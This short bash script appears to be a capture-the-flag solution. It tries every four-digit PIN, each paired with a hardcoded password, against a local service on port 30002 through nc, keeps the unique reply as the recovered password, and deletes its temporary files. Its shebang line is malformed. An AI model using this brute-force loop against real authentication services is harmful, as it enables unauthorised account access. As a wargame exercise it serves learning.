#!/bin/bash/ 
PASSWORD=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
PORT=30002
 
echo "The cracker is now processing..."
 
for pin in {0000..9999};
do
    echo $PASSWORD $pin >> tmp.txt
done
 
cat tmp.txt | nc localhost $PORT>> output.txt
sort output.txt | uniq -u >> password
cat password
 
rm -rf tmp.txt
rm -rf output.txt
rm -rf password
